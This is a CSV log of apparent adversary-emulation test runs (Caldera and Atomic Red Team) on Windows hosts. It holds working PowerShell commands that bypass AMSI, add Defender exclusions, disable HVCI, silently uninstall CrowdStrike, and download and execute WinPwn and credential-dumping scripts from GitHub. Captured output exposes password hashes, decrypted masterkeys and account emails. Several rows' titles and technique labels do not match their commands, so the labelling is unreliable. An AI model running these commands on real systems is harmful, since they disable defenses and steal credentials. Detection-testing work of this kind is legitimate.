111,Initial-Success,defense-evasion,defense-evasion :: Impair Defenses: Disable or Modify Tools,defense-evasion :: ['WinPwn - Kill the event log services for stealth'],defense-evasion :: T1562.001,operation__atomic_windows_depfalse_pshtrue__t1562_001__defense-evasion__impair_defenses-_disable_or_modify_tools__e0946bc3b8b888d6c4cdf3f023fe3c0b__SAVED_2024-03-09_072719,atomic_windows_depfalse_pshtrue__t1562_001__defense-evasion__impair_defenses-_disable_or_modify_tools__e0946bc3b8b888d6c4cdf3f023fe3c0b,['e0946bc3b8b888d6c4cdf3f023fe3c0b'],1,1,0,[0],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],"['$excludedExts= "".exe""; Add-MpPreference -ExclusionExtension  $excludedExts']","['Malware can exclude specific extensions from being scanned and evading detection. \nUpon successful execution, the extension(s) should be on the list of excluded extensions.\nTo check the exclusion list using poweshell  (Get-MpPreference).ExclusionExtension.\n']",['Tamper with Windows Defender Evade Scanning -Extension'],"[{'tactic': 'defense-evasion', 'technique_name': 'Impair Defenses: Disable or Modify Tools', 'technique_id': 'T1562.001'}]",['windows'],['psh']
112,Initial-Success,defense-evasion,defense-evasion :: Impair Defenses: Disable or Modify Tools,defense-evasion :: ['LockBit Black - Disable Privacy Settings Experience Using Registry -Powershell'],defense-evasion :: T1562.001,operation__atomic_windows_depfalse_pshtrue__t1562_001__defense-evasion__impair_defenses-_disable_or_modify_tools__d5bb3cda05ddba230c90c1afb2640379__SAVED_2024-03-09_071830,atomic_windows_depfalse_pshtrue__t1562_001__defense-evasion__impair_defenses-_disable_or_modify_tools__d5bb3cda05ddba230c90c1afb2640379,['d5bb3cda05ddba230c90c1afb2640379'],1,0,1,[1],"[""        _                  _    ___  _ __ | |__   __ _ _ __ |  |_ / _ \\ _ __ ___ | '_ \\| '_ \\ / _` | '_ \\|  __| | | | '_ ` _ \\ | |_) | | | | (_| | | | |  |_| |_| | | | | | | | .__/|_| |_|\\__,_|_| |_|\\ __|\\___/|_| |_| |_| |_|[!] I'm here to blur the line...[*] Enumerating threads of PID: 1256...[*] Parsing Event Log Service Threads...[+] Thread 1360 Succesfully Killed![+] Thread 1416 Succesfully Killed![+] Thread 1420 Succesfully Killed![+] Thread 1424 Succesfully Killed![+] All done, you are ready to go!""]",[''],['0'],"[""$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); inv-phantom -consoleoutput -noninteractive""]",['Kill the event log services for stealth via function of WinPwn'],['WinPwn - Kill the event log services for stealth'],"[{'tactic': 'defense-evasion', 'technique_name': 'Impair Defenses: Disable or Modify Tools', 'technique_id': 'T1562.001'}]",['windows'],['psh']
114,Initial-Success,defense-evasion,defense-evasion :: Impair Defenses: Disable or Modify Tools,defense-evasion :: ['Disable Hypervisor-Enforced Code Integrity (HVCI)'],defense-evasion :: T1562.001,operation__atomic_windows_depfalse_pshtrue__t1562_001__defense-evasion__impair_defenses-_disable_or_modify_tools__c407315583b3a00d9a2e0c3c510f2c96__SAVED_2024-03-09_070051,atomic_windows_depfalse_pshtrue__t1562_001__defense-evasion__impair_defenses-_disable_or_modify_tools__c407315583b3a00d9a2e0c3c510f2c96,['c407315583b3a00d9a2e0c3c510f2c96'],1,1,0,[0],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],"['$excludedProcess = ""outlook.exe""; Add-MpPreference -ExclusionProcess $excludedProcess']","['Malware can exclude specific processes from being scanned and evading detection.\nUpon successful execution, the process(es) should be on the list of excluded processes. \nTo check the exclusion list using poweshell  (Get-MpPreference).ExclusionProcess.""\n']",['Tamper with Windows Defender Evade Scanning -Process'],"[{'tactic': 'defense-evasion', 'technique_name': 'Impair Defenses: Disable or Modify Tools', 'technique_id': 'T1562.001'}]",['windows'],['psh']
115,Initial-Success,defense-evasion,defense-evasion :: Impair Defenses: Disable or Modify Tools,defense-evasion :: ['Disable Microsoft Office Security Features'],defense-evasion :: T1562.001,operation__atomic_windows_depfalse_pshtrue__t1562_001__defense-evasion__impair_defenses-_disable_or_modify_tools__b97004a5d9c4283b6085ddf3ff0d6b4c__SAVED_2024-03-09_065204,atomic_windows_depfalse_pshtrue__t1562_001__defense-evasion__impair_defenses-_disable_or_modify_tools__b97004a5d9c4283b6085ddf3ff0d6b4c,['b97004a5d9c4283b6085ddf3ff0d6b4c'],1,0,1,[1],['The operation completed successfully.\r'],[''],['0'],"['reg add ""HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\HypervisorEnforcedCodeIntegrity"" /v ""Enabled"" /t REG_DWORD /d 0 /f']","['This test disables Hypervisor-Enforced Code Integrity (HVCI) by setting the registry key HKLM:\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\HypervisorEnforcedCodeIntegrity ""Enabled"" value to ""0"".\nThe pre-req needs to be ran in order to setup HVCI and have it enabled. \nWe do not recommend running this in production.\n[Black Lotus Campaign](https://www.microsoft.com/en-us/security/blog/2023/04/11/guidance-for-investigating-attacks-using-cve-2022-21894-the-blacklotus-campaign/)\n[Microsoft](https://learn.microsoft.com/en-us/windows/security/threat-protection/device-guard/enable-virtualization-based-protection-of-code-integrity)\n']",['Disable Hypervisor-Enforced Code Integrity (HVCI)'],"[{'tactic': 'defense-evasion', 'technique_name': 'Impair Defenses: Disable or Modify Tools', 'technique_id': 'T1562.001'}]",['windows'],['psh']
118,Initial-Success,defense-evasion,defense-evasion :: Impair Defenses: Disable or Modify Tools,defense-evasion :: ['Tamper with Windows Defender ATP using Aliases - PowerShell'],defense-evasion :: T1562.001,operation__atomic_windows_depfalse_pshtrue__t1562_001__defense-evasion__impair_defenses-_disable_or_modify_tools__34952e2eefd3066c5f574744e1734ca6__SAVED_2024-03-09_054134,atomic_windows_depfalse_pshtrue__t1562_001__defense-evasion__impair_defenses-_disable_or_modify_tools__34952e2eefd3066c5f574744e1734ca6,['34952e2eefd3066c5f574744e1734ca6'],1,1,0,[0],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],"[""[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)""]","['Any easy way to bypass AMSI inspection is it patch the dll in memory setting the ""amsiInitFailed"" function to true.\nUpon execution, no output is displayed.\n\nhttps://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/\n']",['AMSI Bypass - AMSI InitFailed'],"[{'tactic': 'defense-evasion', 'technique_name': 'Impair Defenses: Disable or Modify Tools', 'technique_id': 'T1562.001'}]",['windows'],['psh']
119,Initial-Success,defense-evasion,defense-evasion :: Impair Defenses: Disable or Modify Tools,defense-evasion :: ['Disable Defender Using NirSoft AdvancedRun'],defense-evasion :: T1562.001,operation__atomic_windows_depfalse_pshtrue__t1562_001__defense-evasion__impair_defenses-_disable_or_modify_tools__32047c4f30d4e65ebc9b22b9b8368bca__SAVED_2024-03-09_053245,atomic_windows_depfalse_pshtrue__t1562_001__defense-evasion__impair_defenses-_disable_or_modify_tools__32047c4f30d4e65ebc9b22b9b8368bca,['32047c4f30d4e65ebc9b22b9b8368bca'],1,1,0,[0],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],['Set-MpPreference -drtm $True; Set-MpPreference -dbm $True; Set-MpPreference -dscrptsc $True; Set-MpPreference -dbaf $True'],['Attempting to disable scheduled scanning and other parts of Windows Defender ATP using set-MpPreference aliases. Upon execution Virus and Threat Protection will show as disabled\nin Windows settings.\n'],['Tamper with Windows Defender ATP using Aliases - PowerShell'],"[{'tactic': 'defense-evasion', 'technique_name': 'Impair Defenses: Disable or Modify Tools', 'technique_id': 'T1562.001'}]",['windows'],['psh']
121,Initial-Success,defense-evasion,defense-evasion :: Impair Defenses: Disable or Modify Tools,defense-evasion :: ['Kill antimalware protected processes using Backstab'],defense-evasion :: T1562.001,operation__atomic_windows_depfalse_pshtrue__t1562_001__defense-evasion__impair_defenses-_disable_or_modify_tools__392e12d6a466407e28d1bb51cf0729bb__SAVED_2024-03-09_055024,atomic_windows_depfalse_pshtrue__t1562_001__defense-evasion__impair_defenses-_disable_or_modify_tools__392e12d6a466407e28d1bb51cf0729bb,['392e12d6a466407e28d1bb51cf0729bb'],1,1,0,[0],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],"['Remove-Item -Path ""HKLM:\\SOFTWARE\\Microsoft\\AMSI\\Providers\\{2781761E-28E0-4109-99FE-B9D127C57AFE}"" -Recurse']","['With administrative rights, an adversary can remove the AMSI Provider registry key in HKLM\\Software\\Microsoft\\AMSI to disable AMSI inspection.\nThis test removes the Windows Defender provider registry key. Upon execution, no output is displayed.\nOpen Registry Editor and navigate to ""HKLM:\\SOFTWARE\\Microsoft\\AMSI\\Providers\\"" to verify that it is gone.\n']",['AMSI Bypass - Remove AMSI Provider Reg Key'],"[{'tactic': 'defense-evasion', 'technique_name': 'Impair Defenses: Disable or Modify Tools', 'technique_id': 'T1562.001'}]",['windows'],['psh']
123,Initial-Success,defense-evasion,defense-evasion :: Impair Defenses: Disable or Modify Tools,defense-evasion :: ['Tamper with Windows Defender Evade Scanning -Folder'],defense-evasion :: T1562.001,operation__atomic_windows_depfalse_pshtrue__t1562_001__defense-evasion__impair_defenses-_disable_or_modify_tools__43e3334362b140924f001b256b229ee5__SAVED_2024-03-09_055914,atomic_windows_depfalse_pshtrue__t1562_001__defense-evasion__impair_defenses-_disable_or_modify_tools__43e3334362b140924f001b256b229ee5,['43e3334362b140924f001b256b229ee5'],1,1,0,[0],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],"['Set-ItemProperty ""HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender"" -Name DisableAntiSpyware -Value 1']","['Disable Windows Defender from starting after a reboot. Upen execution, if the computer is rebooted the entire Virus and Threat protection window in Settings will be\ngrayed out and have no info.\n']",['Tamper with Windows Defender Registry'],"[{'tactic': 'defense-evasion', 'technique_name': 'Impair Defenses: Disable or Modify Tools', 'technique_id': 'T1562.001'}]",['windows'],['psh']
124,Initial-Success,defense-evasion,defense-evasion :: Impair Defenses: Disable or Modify Tools,defense-evasion :: ['Lockbit Black - Use Registry Editor to turn on automatic logon -Powershell'],defense-evasion :: T1562.001,operation__atomic_windows_depfalse_pshtrue__t1562_001__defense-evasion__impair_defenses-_disable_or_modify_tools__5c4ea84c2b050f1f8b6f880755ccbc62__SAVED_2024-03-09_062540,atomic_windows_depfalse_pshtrue__t1562_001__defense-evasion__impair_defenses-_disable_or_modify_tools__5c4ea84c2b050f1f8b6f880755ccbc62,['5c4ea84c2b050f1f8b6f880755ccbc62'],1,1,0,[0],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],"['$excludedpath= ""C:\\Temp""; Add-MpPreference -ExclusionPath $excludedpath']","['Malware can exclude a specific path from being scanned and evading detection. \nUpon successul execution, the file provided should be on the list of excluded path. \nTo check the exclusion list using poweshell (Get-MpPreference).ExclusionPath \n']",['Tamper with Windows Defender Evade Scanning -Folder'],"[{'tactic': 'defense-evasion', 'technique_name': 'Impair Defenses: Disable or Modify Tools', 'technique_id': 'T1562.001'}]",['windows'],['psh']
126,Initial-Success,collection,collection :: Archive Collected Data,collection :: ['Compress Data for Exfiltration With PowerShell'],collection :: T1560,operation__atomic_windows_depfalse_pshtrue__t1562_001__defense-evasion__impair_defenses-_disable_or_modify_tools__2e9acde621e7768a73c1b9a1157c444d__SAVED_2024-03-09_052355,atomic_windows_depfalse_pshtrue__t1562_001__defense-evasion__impair_defenses-_disable_or_modify_tools__2e9acde621e7768a73c1b9a1157c444d,['2e9acde621e7768a73c1b9a1157c444d'],1,1,0,[0],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],"['if (Test-Path ""C:\\ProgramData\\Package Cache\\{7489ba93-b668-447f-8401-7e57a6fe538d}\\WindowsSensor.exe"") {. ""C:\\ProgramData\\Package Cache\\{7489ba93-b668-447f-8401-7e57a6fe538d}\\WindowsSensor.exe"" /repair /uninstall /quiet } else { Get-ChildItem -Path ""C:\\ProgramData\\Package Cache"" -Include ""WindowsSensor.exe"" -Recurse | % { $sig=$(Get-AuthenticodeSignature -FilePath $_.FullName); if ($sig.Status -eq ""Valid"" -and $sig.SignerCertificate.DnsNameList -eq ""CrowdStrike, Inc."") { . ""$_"" /repair /uninstall /quiet; break;}}}']",['Uninstall Crowdstrike Falcon. If the WindowsSensor.exe path is not provided as an argument we need to search for it. Since the executable is located in a folder named with a random guid we need to identify it before invoking the uninstaller.\n'],['Uninstall Crowdstrike Falcon on Windows'],"[{'tactic': 'defense-evasion', 'technique_name': 'Impair Defenses: Disable or Modify Tools', 'technique_id': 'T1562.001'}]",['windows'],['psh']
143,Initial-Success,credential-access,credential-access :: Credentials from Password Stores,credential-access :: ['Dump credentials from Windows Credential Manager With PowerShell [windows Credentials]'],credential-access :: T1555,operation__atomic_windows_depfalse_pshtrue__t1555__credential-access__credentials_from_password_stores__f5606cc7632289d5ca72d4a485c14f6b__SAVED_2024-03-09_031506,atomic_windows_depfalse_pshtrue__t1555__credential-access__credentials_from_password_stores__f5606cc7632289d5ca72d4a485c14f6b,['f5606cc7632289d5ca72d4a485c14f6b'],1,0,1,[1],"['Credentials in vault: Web CredentialsCredential schema: Windows Web Password CredentialResource: https://app.simplenote.com/Identity: hpacherkar@ymail.comSaved By: Internet ExplorerHidden: YesRoaming: NoProperty (schema element id,value): (100,D5B63C4E5625D84CA48DC755C737CBA6)']",[''],['0'],"['vaultcmd /listcreds:""Web Credentials"" /all']",['This module will enumerate credentials stored in Web Credentials vault of Windows Credential Manager using builtin utility vaultcmd.exe'],['Enumerate credentials from Windows Credential Manager using vaultcmd.exe [Web Credentials]'],"[{'tactic': 'credential-access', 'technique_name': 'Credentials from Password Stores', 'technique_id': 'T1555'}]",['windows'],['psh']
144,Initial-Success,credential-access,credential-access :: Credentials from Password Stores,credential-access :: ['WinPwn - Loot local Credentials - Wifi Credentials'],credential-access :: T1555,operation__atomic_windows_depfalse_pshtrue__t1555__credential-access__credentials_from_password_stores__d74777514cba5a4fd4f297261ed0d8ef__SAVED_2024-03-09_030825,atomic_windows_depfalse_pshtrue__t1555__credential-access__credentials_from_password_stores__d74777514cba5a4fd4f297261ed0d8ef,['d74777514cba5a4fd4f297261ed0d8ef'],1,0,1,[1],['Username             Hostname                    Password--------             --------                    --------hpacherkar@ymail.com https://app.simplenote.com/         '],[''],['0'],"[""IEX (IWR 'https://raw.githubusercontent.com/skar4444/Windows-Credential-Manager/4ad208e70c80dd2a9961db40793da291b1981e01/GetCredmanCreds.ps1' -UseBasicParsing); Get-PasswordVaultCredentials -Force""]",['This module will extract the credentials from Windows Credential Manager'],['Dump credentials from Windows Credential Manager With PowerShell [windows Credentials]'],"[{'tactic': 'credential-access', 'technique_name': 'Credentials from Password Stores', 'technique_id': 'T1555'}]",['windows'],['psh']
145,Initial-Success,credential-access,credential-access :: Credentials from Password Stores,credential-access :: ['Extract Windows Credential Manager via VBA'],credential-access :: T1555,operation__atomic_windows_depfalse_pshtrue__t1555__credential-access__credentials_from_password_stores__c7aa16aea441e7bec9a6391af601acc9__SAVED_2024-03-09_030139,atomic_windows_depfalse_pshtrue__t1555__credential-access__credentials_from_password_stores__c7aa16aea441e7bec9a6391af601acc9,['c7aa16aea441e7bec9a6391af601acc9'],1,0,1,[1],['Saving to .\\Exploitation\\WIFI_Keys.txt'],[''],['0'],"[""$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); wificreds -consoleoutput -noninteractive""]",['Loot local Credentials - Wifi Credentials technique via function of WinPwn'],['WinPwn - Loot local Credentials - Wifi Credentials'],"[{'tactic': 'credential-access', 'technique_name': 'Credentials from Password Stores', 'technique_id': 'T1555'}]",['windows'],['psh']
147,Initial-Success,credential-access,credential-access :: Credentials from Password Stores,credential-access :: ['Enumerate credentials from Windows Credential Manager using vaultcmd.exe [Windows Credentials]'],credential-access :: T1555,operation__atomic_windows_depfalse_pshtrue__t1555__credential-access__credentials_from_password_stores__9d0478981edda6091f911a1305025bde__SAVED_2024-03-09_025458,atomic_windows_depfalse_pshtrue__t1555__credential-access__credentials_from_password_stores__9d0478981edda6091f911a1305025bde,['9d0478981edda6091f911a1305025bde'],1,0,1,[1],['Username          Domain      Hostname                                                     Password--------          ------      --------                                                     --------zshu1@outlook.com outlook.com LegacyGeneric:target=MicrosoftAccount:user=zshu1@outlook.com         02ztxtqlzceeisya              WindowsLive:target=virtualapp/didlogical                             '],[''],['0'],"[""IEX (IWR 'https://raw.githubusercontent.com/skar4444/Windows-Credential-Manager/4ad208e70c80dd2a9961db40793da291b1981e01/GetCredmanCreds.ps1' -UseBasicParsing); Get-CredManCreds -Force""]",['This module will extract the credentials from Windows Credential Manager'],['Dump credentials from Windows Credential Manager With PowerShell [web Credentials]'],"[{'tactic': 'credential-access', 'technique_name': 'Credentials from Password Stores', 'technique_id': 'T1555'}]",['windows'],['psh']
148,Initial-Success,credential-access,credential-access :: Credentials from Password Stores,credential-access :: ['WinPwn - Loot local Credentials - lazagne'],credential-access :: T1555,operation__atomic_windows_depfalse_pshtrue__t1555__credential-access__credentials_from_password_stores__6bbb6f8b1db42e2c2c79892e8c31feb3__SAVED_2024-03-09_024140,atomic_windows_depfalse_pshtrue__t1555__credential-access__credentials_from_password_stores__6bbb6f8b1db42e2c2c79892e8c31feb3,['6bbb6f8b1db42e2c2c79892e8c31feb3'],1,0,1,[1],['Credentials in vault: Windows CredentialsNo credentials'],[''],['0'],"['vaultcmd /listcreds:""Windows Credentials"" /all']",['This module will enumerate credentials stored in Windows Credentials vault of Windows Credential Manager using builtin utility vaultcmd.exe'],['Enumerate credentials from Windows Credential Manager using vaultcmd.exe [Windows Credentials]'],"[{'tactic': 'credential-access', 'technique_name': 'Credentials from Password Stores', 'technique_id': 'T1555'}]",['windows'],['psh']
149,Initial-Success,credential-access,credential-access :: Credentials from Password Stores: Windows Credential Manager,credential-access :: ['WinPwn - Loot local Credentials - Invoke-WCMDump'],credential-access :: T1555.004,operation__atomic_windows_depfalse_pshtrue__t1555__credential-access__credentials_from_password_stores__2c6e39a39ebf794d74417a7b1291463b__SAVED_2024-03-09_023458,atomic_windows_depfalse_pshtrue__t1555__credential-access__credentials_from_password_stores__2c6e39a39ebf794d74417a7b1291463b,['2c6e39a39ebf794d74417a7b1291463b'],1,0,1,[1],"['Checking, if the file was killed by antivirus:Not killed, Executing:|====================================================================||                                                                    ||                        The LaZagne Project                         ||                                                                    ||                          ! BANG BANG !                             ||                                                                    ||====================================================================|[+] System masterkey decrypted for 459d4dab-647a-4e9a-8e70-f01e92e40100[+] System masterkey decrypted for 6afaf68e-3bfd-4aaf-bed2-2cacadaeb151[+] System masterkey decrypted for 8eed855b-8ca0-4e71-9e09-9f4604eb9c9e[+] System masterkey decrypted for 97933b80-8e65-4dcf-8280-ba3e6bcedc9d[+] System masterkey decrypted for b86e9ee0-91cc-4cf2-a26c-c6cc6f1b0323[+] System masterkey decrypted for c401e9d7-6a58-4e04-b151-00b690301c03[+] System masterkey decrypted for cb768f88-8792-42de-becb-71b9d1b97983[+] System masterkey decrypted for d28b1d7f-9eca-4b34-81db-c36ca2c3f4f4########## User: SYSTEM ##########------------------- Pypykatz passwords -----------------[+] Shahash found !!!Shahash: 84e755f7536c91eaeecef494c468a1aab27fa2fcNthash: 4713984be0a9c3038e4bd6b01e3a2f80Login: puma-4------------------- Hashdump passwords -----------------Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:a547c2d024acd8763600ef6ef343a66e:::puma-4:1001:aad3b435b51404eeaad3b435b51404ee:4713984be0a9c3038e4bd6b01e3a2f80:::sshd:1002:aad3b435b51404eeaad3b435b51404ee:3cc665ebc83e501dce5c588b45c7b2c8:::user:1003:aad3b435b51404eeaad3b435b51404ee:57d583aa46d571502aad4bb7aea09c70:::------------------- Lsa_secrets passwords -----------------DPAPI_SYSTEM0000   01 00 00 00 7E F0 40 14 10 59 7E DC CF 5E 83 0B    ....~.@..Y~..^..0010   7C EE 6E 8B B8 01 54 40 C3 14 50 27 5E 03 9B C9    |.n...T@..P\'^...0020   79 42 59 3C 11 6A 42 43 43 63 B7 4D                yBY<.jBCCc.MNL$KM0000   40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    @...............0010   21 B3 A2 1E 5B 6C F6 1E 3E 31 F6 D2 2C 0E 53 86    !...[l..>1..,.S.0020   E1 EE DF F2 B7 76 F2 B0 BF C3 7E 90 EF FE 12 3B    .....v....~....;0030   22 BC B3 86 90 12 B0 13 99 4B AD 62 DF 54 30 02    ""........K.b.T0.0040   A1 56 5F 19 6A 12 21 15 18 24 B2 64 22 33 C2 AE    .V_.j.!..$.d""3..0050   F0 C9 5A E4 E5 DE EC 58 FE F9 CE B1 CC 95 7A 41    ..Z....X......zA########## User: puma-4 ##########------------------- Credman passwords ------------------------------------ Vault passwords -----------------[+] Password found !!!URL: https://app.simplenote.com/Login: hpacherkar@ymail.comName: Internet ExplorerPassword:  ------------------- Chromium edge passwords -----------------[+] Password found !!!URL: https://app.simplenote.com/Login: hpacherkar@ymail.comPassword:  [+] 84e755f7536c91eaeecef494c468a1aab27fa2fc ok for masterkey 0b1d903f-cd89-48c7-bc2b-814f639079e9[+] 84e755f7536c91eaeecef494c468a1aab27fa2fc ok for masterkey 2a6e5e1b-ea14-4682-90f3-5320f842ae8d[+] 84e755f7536c91eaeecef494c468a1aab27fa2fc ok for masterkey 34d01a77-9f8c-4379-9783-6fbd87a9d66a[+] 84e755f7536c91eaeecef494c468a1aab27fa2fc ok for masterkey 350c5b6c-1c9b-4280-8e67-ab41f715dc98[+] 84e755f7536c91eaeecef494c468a1aab27fa2fc ok for masterkey 42d9f586-7f08-4edd-bf28-3678f5a04a4c[+] 84e755f7536c91eaeecef494c468a1aab27fa2fc ok for masterkey 94356951-40e9-4ef6-89d3-ccb03960617a[+] 84e755f7536c91eaeecef494c468a1aab27fa2fc ok for masterkey a3122f3f-d7c9-4249-8bca-88413cca8ea6------------------- Vaultfiles passwords -----------------[+] Password found !!!URL: https://app.simplenote.com/Login: hpacherkar@ymail.comPassword:  File: C:\\Users\\puma-4\\AppData\\Local\\Microsoft\\Vault\\4BF4C442-9B8A-41A0-B380-DD4A704DDB28\\28DCB83B9B8A976311B3DCB4A6A93CCDF33C6F52.vcrd[+] 4 passwords have been found.For more information launch it again with the -v optionelapsed time = 4.9300689697265625Results saved to $currentPath\\Lazagne\\Passwords.txt!']",[''],['0'],"[""$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); lazagnemodule -consoleoutput -noninteractive""]","['The [LaZagne project](https://github.com/AlessandroZ/LaZagne) is an open source application used to retrieve lots of passwords stored on a local computer. \nEach software stores its passwords using different techniques (plaintext, APIs, custom algorithms, databases, etc.). \nThis tool has been developed for the purpose of finding these passwords for the most commonly-used software']",['WinPwn - Loot local Credentials - lazagne'],"[{'tactic': 'credential-access', 'technique_name': 'Credentials from Password Stores', 'technique_id': 'T1555'}]",['windows'],['psh']
150,Initial-Success,credential-access,credential-access :: Credentials from Password Stores: Credentials from Web Browsers,credential-access :: ['Simulating access to Chrome Login Data'],credential-access :: T1555.003,operation__atomic_windows_depfalse_pshtrue__t1555_004__credential-access__credentials_from_password_stores-_windows_credential_manager__1353d954c020fa5ff039b7e85ee261bc__SAVED_2024-03-09_022814,atomic_windows_depfalse_pshtrue__t1555_004__credential-access__credentials_from_password_stores-_windows_credential_manager__1353d954c020fa5ff039b7e85ee261bc,['1353d954c020fa5ff039b7e85ee261bc'],1,0,1,[1],['Username         : zshu1@outlook.comPassword         : Target           : MicrosoftAccount:user=zshu1@outlook.comDescription      : PersistedCredentialLastWriteTime    : 3/8/2024 12:44:37 PMLastWriteTimeUtc : 3/8/2024 5:44:37 PMType             : GenericPersistenceType  : LocalComputer'],[''],['0'],"[""iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/DumpWCM.ps1'); Invoke-WCMDump""]",['Loot local Credentials - Invoke-WCMDump technique via function of WinPwn'],['WinPwn - Loot local Credentials - Invoke-WCMDump'],"[{'tactic': 'credential-access', 'technique_name': 'Credentials from Password Stores: Windows Credential Manager', 'technique_id': 'T1555.004'}]",['windows'],['psh']
152,Initial-Success,credential-access,credential-access :: Credentials from Password Stores: Credentials from Web Browsers,credential-access :: ['WinPwn - Loot local Credentials - mimi-kittenz'],credential-access :: T1555.003,operation__atomic_windows_depfalse_pshtrue__t1555_003__credential-access__credentials_from_password_stores-_credentials_from_web_browsers__e5279c9ad109fef655e2c1abd6304725__SAVED_2024-03-09_021455,atomic_windows_depfalse_pshtrue__t1555_003__credential-access__credentials_from_password_stores-_credentials_from_web_browsers__e5279c9ad109fef655e2c1abd6304725,['e5279c9ad109fef655e2c1abd6304725'],1,1,0,[0],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],"['Copy-Item ""$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Default"" -Destination ""PathToAtomicsFolder\\..\\ExternalPayloads\\Edge"" -Force -Recurse']","[""Simulates an adversary accessing encrypted credentials from Edge web browser's login database.\nmore info in https://www.forensicfocus.com/articles/chromium-based-microsoft-edge-from-a-forensic-point-of-view/\n""]",['Simulating access to Windows Edge Login Data'],"[{'tactic': 'credential-access', 'technique_name': 'Credentials from Password Stores: Credentials from Web Browsers', 'technique_id': 'T1555.003'}]",['windows'],['psh']
153,Initial-Success,credential-access,credential-access :: Credentials from Password Stores: Credentials from Web Browsers,credential-access :: ['WinPwn - PowerSharpPack - Sharpweb for Browser Credentials'],credential-access :: T1555.003,operation__atomic_windows_depfalse_pshtrue__t1555_003__credential-access__credentials_from_password_stores-_credentials_from_web_browsers__c6ea575d9641c11410417105f14175ab__SAVED_2024-03-09_020814,atomic_windows_depfalse_pshtrue__t1555_003__credential-access__credentials_from_password_stores-_credentials_from_web_browsers__c6ea575d9641c11410417105f14175ab,['c6ea575d9641c11410417105f14175ab'],1,0,1,[1],"['Running the small kittie, output to .\\Exploitation\\kittenz.txt             The kittie is running, logo removed due to AV']",[''],['0'],"[""$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); kittenz -consoleoutput -noninteractive""]",['Loot local Credentials - mimi-kittenz technique via function of WinPwn - Extend timeout to 600s'],['WinPwn - Loot local Credentials - mimi-kittenz'],"[{'tactic': 'credential-access', 'technique_name': 'Credentials from Password Stores: Credentials from Web Browsers', 'technique_id': 'T1555.003'}]",['windows'],['psh']
168,Initial-Success,defense-evasion,defense-evasion :: Subvert Trust Controls: Install Root Certificate,defense-evasion :: ['Install root CA on Windows with certutil'],defense-evasion :: T1553.004,operation__atomic_windows_depfalse_pshtrue__t1553_004__defense-evasion__subvert_trust_controls-_install_root_certificate__9d21f3b551b40fa40056af1244af56ee__SAVED_2024-03-09_003439,atomic_windows_depfalse_pshtrue__t1553_004__defense-evasion__subvert_trust_controls-_install_root_certificate__9d21f3b551b40fa40056af1244af56ee,['9d21f3b551b40fa40056af1244af56ee'],1,0,1,[1],['ReturnValue PSComputerName----------- --------------          0                         0               '],[''],['0'],"[""IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1553.004/src/RemoteCertTrust.ps1' -UseBasicParsing)""]",['The following Atomic test simulates adding a generic non-malicious certificate to the CurrentUser certificate store. This behavior generates a registry modification that adds the cloned root CA certificate in the keys outlined in the blog.\nKeys will look like - \\SystemCertificates\\CA\\Certificates or \\SystemCertificates\\Root\\Certificates\nReference: https://posts.specterops.io/code-signing-certificate-cloning-attacks-and-defenses-6f98657fc6ec\n'],['Add Root Certificate to CurrentUser Certificate Store'],"[{'tactic': 'defense-evasion', 'technique_name': 'Subvert Trust Controls: Install Root Certificate', 'technique_id': 